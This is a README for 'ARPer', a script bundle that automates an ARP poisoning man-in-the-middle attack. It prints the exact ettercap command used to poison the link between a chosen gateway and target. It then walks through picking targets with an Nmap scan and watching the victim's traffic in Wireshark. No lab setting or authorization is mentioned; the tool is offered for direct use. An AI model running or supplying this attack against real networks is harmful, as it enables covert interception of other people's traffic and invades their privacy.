# ARPer
What is ARPer?

ARPer is a mixture of Python and Bash scripting. This script helps a user easily setup a ARPposion attack.

Getting up and running:

First run the install.sh script of software dependences, and then change connection point/driver name to make script run.

Script will not run unless you add your connection point/driver name.
Change the following py line 16 in ARPposion.py, located it the attack folder:
    
attack1 = os.system("sudo ettercap -T -S -i <Add connection here> -M arp:remote /" + (input("First add gateway: ") + "//" + (input("Add target: ") + "//")))

Find connection point by typing:

iwconfig for WiFi card/driver.

Or:

ifconfig Ethernet or internal card/driver.

Copy and paste the name of chosen driver into <Add connection here> on line 16 of ARPposion.py.
    
Delete '< >' when adding your conection point/driver.

Example:
attack1 = os.system("sudo ettercap -T -S -i wlan0 -M arp:remote /" + (input("First add gateway: ") + "//" + (input("Add target: ") + "//")))

Once connection is changed, script should work.

------------------------------------------------------------------------------------------------

Using the program:

Open the attack folder, then type 'sudo ./ARPer.sh.

A coded Nmap scan will run (which will show defalt gateway, and a list of host targets)

If you know gateway and target: press 'ctrl + C' 2x to skip Nmap scan. Wireshark will also open for network scanning.

First add gateway: will show up, type in your sub gateway ip.
then Add target: will show. Type in target ip, and the ARPposion attack will start.

Lastly start a Wireshark scan to watch the network traffic of the targeted ip.

type ip.addr == <target ip> into Wireshark search to monitor targeted traffic.
